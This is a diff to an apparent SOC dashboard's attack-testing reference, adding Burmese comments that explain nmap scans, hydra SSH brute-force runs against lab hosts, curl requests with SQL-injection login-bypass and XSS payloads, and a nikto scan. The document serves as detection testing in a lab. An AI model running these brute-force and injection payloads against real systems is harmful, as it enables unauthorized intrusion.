@@ -24,6 +24,12 @@
 ## Pre-flight Checklist
 
 ```bash
+# Kali ရဲ့ IP address စစ်
+ip a show eth0 | grep "inet "
+# ip a      : ip address subcommand (ifconfig alternative)
+# show eth0 : eth0 interface ကိုသာ ပြ
+# grep "inet " : IPv4 line ကိုသာ filter (inet6 မပါစေဖို့ space ပါ)
+
 # Kali မှာ lab route ရှိမရှိ စစ်
 ip route | grep "10.0.0.0"
 
@@ -76,6 +82,11 @@ sudo nmap -sV -T3 -p 3306,22 10.20.20.10
 #        ↑
 #        └── -sV : Service Version detection — port ဖွင့်ထားသော service ၏ version စစ်
 
+# DNS server scan
+sudo nmap -sS -T3 -p 53,22 10.10.10.20
+#                    ↑
+#                    └── port 53 : DNS standard port (TCP/UDP) — zone transfer request ကို TCP ကသုံး
+
 # LDAP server scan
 sudo nmap -sV -T3 -p 389,636,22 10.20.20.20
 #                    ↑   ↑
@@ -101,12 +112,15 @@ hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.10.10.10
 
 # company-dns-server SSH brute
 hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.10.10.20
+# ↑ web-server နှင့် flag အတူတူ — target IP ကိုသာ 10.10.10.20 (DNS server) ပြောင်း
 
 # company-customer-db SSH brute
 hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.20.20.10
+# ↑ target IP 10.20.20.10 (MySQL DB server) — SSH port 22 ကို brute
 
 # company-ldap-server SSH brute
 hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.20.20.20
+# ↑ target IP 10.20.20.20 (LDAP server) — SSH service ကို brute
 ```
 
 **Dashboard မှာ မြင်ရမည်:** SSH Sessions tab + Active Alerts → HIGH + Defense Center → auto-block
@@ -157,11 +171,15 @@ curl -si --max-time 5 --get \
 curl -si --max-time 5 --get \
   --data-urlencode "id=1' OR '1'='1" \
   http://10.10.10.10/login
+# ↑ payload: OR '1'='1 → condition အမြဲ true ဖြစ်အောင် — login bypass technique
+#   /login endpoint ကို target — credential မပါဘဲ authenticate ဝင်ကြိုး
 
 # XSS (Cross-Site Scripting)
 curl -si --max-time 5 --get \
   --data-urlencode "q=<script>alert('aegis-test')</script>" \
   http://10.10.10.10/
+# ↑ payload: <script>alert()</script> → browser မှာ execute ဖြစ်ရင် XSS အတည် 
+#   q= parameter ကတဆင့် inject — server က sanitize မလုပ်ရင် Suricata ဖမ်းမည်
 
 # Nikto web vulnerability scan
 nikto -h http://10.10.10.10 -maxtime 1m -Pause 1
@@ -508,4 +526,4 @@ curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ldap \
 
 ---
 
-*Last updated: 2026-07-26 | AEGIS SOC Dashboard — Attack Testing Reference*
+*Last updated: 2026-07-26 (explanations added for all commands) | AEGIS SOC Dashboard — Attack Testing Reference*
